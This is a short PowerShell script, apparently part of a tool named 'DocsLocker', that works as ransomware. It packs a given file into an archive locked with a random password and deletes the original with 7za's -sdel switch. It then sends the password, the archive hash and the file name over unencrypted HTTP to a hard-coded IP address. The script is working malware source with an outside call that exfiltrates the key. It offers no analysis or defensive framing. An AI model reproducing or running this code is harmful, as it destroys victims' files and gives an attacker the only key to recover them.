cd "${env:appdata}\\DocsLocker"

# source: https://blogs.technet.microsoft.com/heyscriptingguy/2015/11/05/generate-random-letters-with-powershell/
$r = -join ((1..10) | %{(65..90) + (97..122) | Get-Random} | % {[char]$_})

$src = $args[0]
$dst = $args[1]

.\7za a -p"${r}" -sdel "${dst}" "${src}"

$pass = [System.Web.HttpUtility]::UrlEncode($r)

# sha256
$hash = (Get-FileHash $dst).Hash
$hash = [System.Web.HttpUtility]::UrlEncode($hash)

# get only file name from the output path
$filename = Split-Path $dst -leaf
$filename = [System.Web.HttpUtility]::UrlEncode($filename)

Invoke-WebRequest -UseBasicParsing -Uri "http://89.221.217.68/DocsLocker/insert.php?pass=${r}&hash=${hash}&filename=${filename}"